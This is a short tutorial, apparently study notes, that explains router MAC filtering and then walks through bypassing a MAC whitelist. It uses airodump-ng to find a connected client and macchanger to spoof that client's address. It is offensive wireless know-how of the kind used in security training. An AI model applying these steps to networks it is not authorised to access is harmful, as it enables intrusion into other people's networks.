## Theory 📚📙📝
- Mac address is Unique to each Network Device.
- Routers can use MAC filtering to  allow/deny devices from connecting based on their **mac address**.
##### 2 Implementations : 
- **BlackLists**  : 
	- some Routers uses a **blacklist**.
	- allows all MACs to cennect except the ones in the list.
- **WhiteLists** : 
	- Some Routers uses **Whitelists**.
	- only allows the MACs which are included in the List.

##  Bypassing MAC White-listing : 

#### Run airodump-ng to list all routers : 

```sh
airodump-ng mon0
```

![Imgur](https://i.imgur.com/m2hbSsS.png)


Copy the BSSID, then : 

```sh
airodump-ng --bssid AA:AA:AA:AA:AA:AA --channel 69 mon0
```

Wait for somebody to oennect to this router.

![Imgur](https://i.imgur.com/LFs6iXL.png)

Copt the Client's MAC address. 
And Change our MAC address to this MAC address.

But Before that don't forget to change back to **managed mode**.

##### Changing our MAC now : 

```sh
ifconfig wlan0 down
macchanger -m AA:AA:AA:AA:AA:AA wlan0
```

Now go and connect to the Target Network : 

![Imgur](https://i.imgur.com/H5AKmAm.png)
